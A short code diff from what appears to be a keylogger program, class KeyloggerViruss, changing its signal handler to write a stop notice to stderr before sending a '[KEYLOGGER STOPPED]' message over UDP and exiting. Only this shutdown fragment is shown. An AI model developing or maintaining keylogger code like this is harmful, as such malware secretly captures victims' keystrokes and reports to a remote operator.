@@ -46,7 +46,7 @@ if getattr(sys, 'frozen', False):
 
 def create_signal_handler(keylogger_instance: KeyloggerViruss):
     def signal_handler(signum, frame):
-        print("Signal received, stopping keylogger...")
+        os.write(2, b"\nSignal received, stopping keylogger...\n")
         message = "[KEYLOGGER STOPPED]"
         keylogger_instance.send_udp_message(message=message, signal=False)
         sys.exit(0)
